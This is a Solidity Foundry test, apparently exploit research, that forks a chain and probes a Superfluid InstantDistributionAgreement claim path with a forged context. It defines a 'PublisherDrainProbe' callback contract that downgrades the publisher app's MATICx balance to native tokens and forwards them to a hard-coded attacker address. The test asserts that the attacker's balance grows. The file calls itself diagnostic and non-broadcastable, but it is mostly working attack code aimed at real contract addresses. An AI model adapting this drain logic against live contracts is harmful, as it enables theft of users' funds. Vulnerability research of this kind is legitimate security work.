// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(
        address token,
        address publisher,
        uint32 indexId
    ) external view returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface ISuperTokenLike {
    function balanceOf(address account) external view returns (uint256);
}

interface IMATICXLike is ISuperTokenLike {
    function downgradeToETH(uint256 wad) external;
}

contract PublisherDrainProbe {
    address internal immutable _attacker;

    uint256 public afterCalls;
    address public lastToken;
    address public lastMsgSender;
    address public lastAppAddress;
    address public lastAppCreditToken;
    uint256 public lastAppCreditGranted;
    uint256 public lastBalanceSeen;
    uint256 public lastNativeForwarded;
    uint8 public lastCallType;
    uint8 public lastAppLevel;
    bytes4 public lastAgreementSelector;

    constructor(address attacker_) {
        _attacker = attacker_;
    }

    function beforeAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    function beforeAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementUpdated(
        address superToken,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx) {
        afterCalls += 1;

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(ctx);
        lastToken = superToken;
        lastMsgSender = decoded.msgSender;
        lastAppAddress = decoded.appAddress;
        lastAppCreditToken = decoded.appCreditToken;
        lastAppCreditGranted = decoded.appCreditGranted;
        lastBalanceSeen = ISuperTokenLike(superToken).balanceOf(address(this));
        lastCallType = decoded.callType;
        lastAppLevel = decoded.appCallbackLevel;
        lastAgreementSelector = decoded.agreementSelector;

        if (lastBalanceSeen > 0) {
            IMATICXLike(superToken).downgradeToETH(lastBalanceSeen);
            lastNativeForwarded = address(this).balance;

            (bool ok,) = _attacker.call{value: lastNativeForwarded}("");
            require(ok, "native forward failed");
        }

        return ctx;
    }

    function beforeAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    receive() external payable {}
}

/// @title Attempt15
/// @notice Hypothesis: on a real app-publisher tuple with live unapproved
///         `pendingDistribution`, forged host-trailing `claim()` still reaches
///         the publisher-side callback, preserves forged `msgSender`, and lets
///         that publisher app call the archived MATICx wrapper surface
///         `downgradeToETH()` to pull its balance out as native POL.
/// @dev Diagnostic only: this uses `vm.etch` to replace a historical live
///      publisher-app address with a probe contract, so it is not directly
///      broadcastable. The point is to validate the real callback frame against
///      source, not to claim a finished exploit.
/// @dev Claim ordering referenced from
///      `sources/ch5_superfluid_v2/0x86e8ac.../src/contracts/agreements/InstantDistributionAgreementV1.sol:847-871`.
///      The non-static after-hook is dispatched by Host
///      `sources/ch5_superfluid_v2/0x513b7c.../src/contracts/superfluid/Superfluid.sol:464-498`.
///      The exact wrapper signature is archived at
///      `sources/ch5_superfluid_v2/0xfd8398.../src/contracts/interfaces/tokens/ISETH.sol:13-15`.
contract Attempt15 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    uint256 constant FORK_BLOCK = 27_039_967;

    address constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address constant PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUBSCRIBER = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    uint32 constant INDEX_ID = 1;

    address constant FORGED_MSG_SENDER = 0x1111111111111111111111111111111111111111;
    address constant FORGED_APP_ADDRESS = 0x2222222222222222222222222222222222222222;

    ISuperfluidHost constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);
    ISuperTokenLike constant MATICX_TOKEN = ISuperTokenLike(MATICX);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(MATICX, "MATICx");
        vm.label(USDCX, "USDCx");
        vm.label(PUBLISHER, "LivePublisherApp");
        vm.label(SUBSCRIBER, "LiveUnapprovedSubscriber");
    }

    function test_real_publisher_callback_preserves_forged_sender_and_can_downgrade_residual() public {
        uint256 nativeBefore = ATTACKER.balance;

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] fork block:", block.number);

        (bool isSuperApp, bool isJailed, uint256 noopMask) = HOST.getAppManifest(PUBLISHER);
        console.log("[manifest] isSuperApp:", isSuperApp);
        console.log("[manifest] isJailed:", isJailed);
        console.log("[manifest] noopMask:", noopMask);

        assertTrue(isSuperApp, "publisher must still be a live SuperApp");
        assertFalse(isJailed, "publisher app must be active");
        assertEq(noopMask, 0, "publisher app must not noop update callbacks");

        (bool indexExists, uint128 indexValue,, uint128 totalUnitsPending) = IDA.getIndex(MATICX, PUBLISHER, INDEX_ID);
        (bool subExists, bool approved,, uint256 pendingDistribution) =
            IDA.getSubscription(MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER);
        uint256 publisherBalanceBefore = MATICX_TOKEN.balanceOf(PUBLISHER);

        console.log("[claimable] index exists:", indexExists);
        console.log("[claimable] index value:", uint256(indexValue));
        console.log("[claimable] total pending units:", uint256(totalUnitsPending));
        console.log("[claimable] sub exists:", subExists);
        console.log("[claimable] approved:", approved);
        console.log("[claimable] pending distribution:", pendingDistribution);
        console.log("[claimable] publisher MATICx before:", publisherBalanceBefore);

        assertTrue(indexExists, "live publisher index must exist");
        assertTrue(subExists, "live subscription tuple must exist");
        assertFalse(approved, "target tuple must stay on the unapproved claim path");
        assertGt(indexValue, 0, "live tuple must have non-zero index value");
        assertGt(pendingDistribution, 0, "live tuple must have positive pending distribution");
        assertGt(
            publisherBalanceBefore,
            pendingDistribution,
            "publisher must retain residual MATICx after claim settlement"
        );

        PublisherDrainProbe template = new PublisherDrainProbe(ATTACKER);
        vm.etch(PUBLISHER, address(template).code);
        vm.label(PUBLISHER, "EtchedPublisherProbe");

        bytes memory fakeCtx = _buildForgedClaimCtx();
        bytes memory inner = abi.encodeCall(IDA.claim, (MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER, fakeCtx));
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        vm.prank(ATTACKER);
        HOST.callAgreement(IDA, outer, new bytes(0));

        PublisherDrainProbe probe = PublisherDrainProbe(payable(PUBLISHER));
        console.log("[probe] after calls:", probe.afterCalls());
        console.log("[probe] last token:", probe.lastToken());
        console.log("[probe] last msgSender:", probe.lastMsgSender());
        console.log("[probe] last appAddress:", probe.lastAppAddress());
        console.log("[probe] last appCreditToken:", probe.lastAppCreditToken());
        console.log("[probe] last appCreditGranted:", probe.lastAppCreditGranted());
        console.log("[probe] last callType:", uint256(probe.lastCallType()));
        console.log("[probe] last appLevel:", uint256(probe.lastAppLevel()));
        console.log("[probe] last balance seen:", probe.lastBalanceSeen());
        console.log("[probe] last native forwarded:", probe.lastNativeForwarded());

        assertEq(probe.lastToken(), MATICX, "callback token should be MATICx");
        assertEq(probe.lastMsgSender(), FORGED_MSG_SENDER, "forged msgSender should survive into callback");
        assertEq(probe.lastAppAddress(), PUBLISHER, "host should overwrite appAddress to publisher app");
        assertEq(probe.lastAppCreditToken(), MATICX, "host should overwrite appCreditToken to claim token");
        assertEq(probe.lastAppCreditGranted(), 0, "claim callback should not grant app credit");
        assertEq(probe.lastCallType(), ContextUtils.CALL_TYPE_APP_CALLBACK, "callback frame should mark APP_CALLBACK");
        assertEq(probe.lastAppLevel(), 1, "callback frame should increment app level");
        assertEq(probe.lastAgreementSelector(), IDA.claim.selector, "agreement selector should stay claim");
        assertGt(probe.lastBalanceSeen(), 0, "publisher probe should see residual post-claim MATICx");
        assertGt(probe.lastNativeForwarded(), 0, "publisher probe should forward native after downgrade");

        (, bool approvedAfter,, uint256 pendingAfter) = IDA.getSubscription(MATICX, PUBLISHER, INDEX_ID, SUBSCRIBER);

        console.log("[post-claim] approved:", approvedAfter);
        console.log("[post-claim] pending:", pendingAfter);

        assertFalse(approvedAfter, "claim should materialize pending without auto-approving subscription");
        assertEq(pendingAfter, 0, "claim should clear pending distribution");

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.logInt(int256(nativeAfter) - int256(nativeBefore));

        assertEq(
            nativeAfter - nativeBefore,
            probe.lastNativeForwarded(),
            "attacker native gain should equal the callback-forwarded amount"
        );
        assertGt(nativeAfter, nativeBefore, "native balance must increase");
    }

    function _buildForgedClaimCtx() internal view returns (bytes memory) {
        ContextUtils.Context memory forged =
            ContextUtils.buildContext(FORGED_MSG_SENDER, IInstantDistributionAgreementV1.claim.selector, hex"617474656d70743135");
        forged.appCreditGranted = type(uint128).max;
        forged.appAddress = FORGED_APP_ADDRESS;
        forged.appCreditToken = USDCX;
        return ContextUtils.encodeContext(forged);
    }
}
